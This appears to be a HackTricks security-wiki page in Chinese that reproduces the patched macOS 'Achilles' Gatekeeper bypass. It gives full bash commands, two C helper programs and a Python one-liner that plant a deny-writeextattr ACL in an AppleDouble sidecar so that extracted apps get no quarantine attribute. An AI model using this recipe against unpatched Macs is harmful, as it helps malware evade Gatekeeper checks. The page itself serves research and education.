# AppleDouble ACL Quarantine Bypass 复现

{{#include ../../../../banners/hacktricks-training.md}}

这个历史概念验证复现了 Achilles Gatekeeper bypass 研究中使用的 AppleDouble/ACL 技术。它会序列化 ACL，将其存储在 AppleDouble sidecar 文件中，将属性重命名为 `com.apple.acl.text`，然后重新打包 ZIP。<sup>[[1]](#references)[[2]](#references)</sup>

Apple 已在 macOS Ventura 13、Monterey 12.6.2 和 Big Sur 11.7.2 中修复了 Gatekeeper bypass；在当前 Mac 上恢复 ACL 并不能证明 Gatekeeper bypass 仍然有效。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

有关 quarantine 和首次启动检查，请参阅 [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses)。

## ACL 和 AppleDouble 文件系统行为

### writeextattr ACL

此 ACL 会阻止向文件添加 `xattrs`】【。

```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```

### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** 文件格式会复制文件及其 ACE。

在[**源代码**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)中可以看到，存储在名为 **`com.apple.acl.text`** 的 xattr 中的 ACL 文本表示形式，会被设置为解压后文件的 ACL。因此，如果你将应用程序压缩为采用 **AppleDouble** 文件格式的 zip 文件，并设置一个阻止其他 xattr 写入的 ACL……那么 quarantine xattr 就不会被设置到应用程序上：

更多信息请查看[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)。<sup>[[1]](#references)</sup>

要复现这一点，我们首先需要获取正确的 ACL 字符串：

```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```

（请注意，即使此方法有效，沙箱也会先写入 quarantine xattr）

## AppleDouble 旁文件的构造与验证

```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
./get_acls /tmp/test
ACL for /tmp/test:
!#acl 1
group:ABCDEFAB-CDEF-ABCD-EFAB-CDEF0000000C:everyone:12:deny:write,writeattr,writeextattr,writesecurity,chown

ACL in hex: \x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43\x44\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x2d\x41\x42\x43\x44\x2d\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x30\x30\x30\x30\x30\x30\x30\x43\x3a\x65\x76\x65\x72\x79\x6f\x6e\x65\x3a\x31\x32\x3a\x64\x65\x6e\x79\x3a\x77\x72\x69\x74\x65\x2c\x77\x72\x69\x74\x65\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x65\x78\x74\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x73\x65\x63\x75\x72\x69\x74\x79\x2c\x63\x68\x6f\x77\x6e\x0a
```

<details>

<summary>get_acls 的代码</summary>

```c
// clang -o get_acls get_acls.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/acl.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <filepath>\n", argv[0]);
        return 1;
    }

    const char *filepath = argv[1];
    acl_t acl = acl_get_file(filepath, ACL_TYPE_EXTENDED);
    if (acl == NULL) {
        perror("acl_get_file");
        return 1;
    }

    char *acl_text = acl_to_text(acl, NULL);
    if (acl_text == NULL) {
        perror("acl_to_text");
        acl_free(acl);
        return 1;
    }

    printf("ACL for %s:\n%s\n", filepath, acl_text);

    // Convert acl_text to hexadecimal and print it
    printf("ACL in hex: ");
    for (char *c = acl_text; *c != '\0'; c++) {
        printf("\\x%02x", (unsigned char)*c);
    }
    printf("\n");

    acl_free(acl);
    acl_free(acl_text);
    return 0;
}
```

</details>

```bash
# Add the com.apple.xxx.xxxx extended attribute containing the ACL
mkdir start
mkdir start/protected
./set_xattr start/protected
echo something > start/protected/something
```

<details>

<summary>set_xattr 的代码</summary>

```c
// gcc -o set_xattr set_xattr.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/xattr.h>
#include <sys/acl.h>


void print_xattrs(const char *filepath) {
    ssize_t buflen = listxattr(filepath, NULL, 0, XATTR_NOFOLLOW);
    if (buflen < 0) {
        perror("listxattr");
        return;
    }

    char *buf = malloc(buflen);
    if (buf == NULL) {
        perror("malloc");
        return;
    }

    buflen = listxattr(filepath, buf, buflen, XATTR_NOFOLLOW);
    if (buflen < 0) {
        perror("listxattr");
        free(buf);
        return;
    }

    printf("All current extended attributes for %s:\n", filepath);
    for (char *name = buf; name < buf + buflen; name += strlen(name) + 1) {
        printf("%s: ", name);
        ssize_t valuelen = getxattr(filepath, name, NULL, 0, 0, XATTR_NOFOLLOW);
        if (valuelen < 0) {
            perror("getxattr");
            continue;
        }

        char *value = malloc(valuelen + 1);
        if (value == NULL) {
            perror("malloc");
            continue;
        }

        valuelen = getxattr(filepath, name, value, valuelen, 0, XATTR_NOFOLLOW);
        if (valuelen < 0) {
            perror("getxattr");
            free(value);
            continue;
        }

        value[valuelen] = '\0';  // Null-terminate the value
        printf("%s\n", value);
        free(value);
    }

    free(buf);
}


int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <filepath>\n", argv[0]);
        return 1;
    }

    const char *hex = "\x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43\x44\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x2d\x41\x42\x43\x44\x2d\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x30\x30\x30\x30\x30\x30\x30\x43\x3a\x65\x76\x65\x72\x79\x6f\x6e\x65\x3a\x31\x32\x3a\x64\x65\x6e\x79\x3a\x77\x72\x69\x74\x65\x2c\x77\x72\x69\x74\x65\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x65\x78\x74\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x73\x65\x63\x75\x72\x69\x74\x79\x2c\x63\x68\x6f\x77\x6e\x0a";
    const char *filepath = argv[1];

    int result = setxattr(filepath, "com.apple.xxx.xxxx", hex, strlen(hex), 0, 0);
    if (result == 0) {
        printf("Extended attribute set successfully.\n\n");
    } else {
        perror("setxattr");
        return 1;
    }

    print_xattrs(filepath);

    return 0;
}
```

</details>

```bash
# Create an AppleDouble file containing the extended attribute
ditto -c -k start protected.zip
rm -rf start
# extract the files
unzip protected.zip
# Replace the extended-attribute name here (ditto would otherwise remove com.apple.acl.text)
python3 -c "with open('._protected', 'rb+') as f: content = f.read().replace(b'com.apple.xxx.xxxx', b'com.apple.acl.text'); f.seek(0); f.write(content); f.truncate()"
# zip everything back together
rm -rf protected.zip
zip -r protected.zip protected ._protected
rm -rf protected
rm ._*
```

```bash
# Check whether the AppleDouble ACL was restored; an ACL is not itself a normal xattr
ditto -x -k --rsrc protected.zip .
ls -lde protected
# A local ditto extraction alone does not test browser/Archive Utility quarantine propagation
xattr -p com.apple.quarantine protected
```



## References

- [1] [Microsoft Security Blog — Gatekeeper 的阿喀琉斯之踵：揭示 macOS 漏洞](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [2] [Apple Developer — 使用 `ditto` 打包 Mac 软件以供分发](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
- [3] [Apple Support — 关于 macOS Ventura 13 的安全内容](https://support.apple.com/en-ae/102853)
- [4] [Apple Support — 关于 macOS Monterey 12.6.2 的安全内容](https://support.apple.com/en-ae/102806)
- [5] [Apple Support — 关于 macOS Big Sur 11.7.2 的安全内容](https://support.apple.com/en-us/102785)
{{#include ../../../../banners/hacktricks-training.md}}
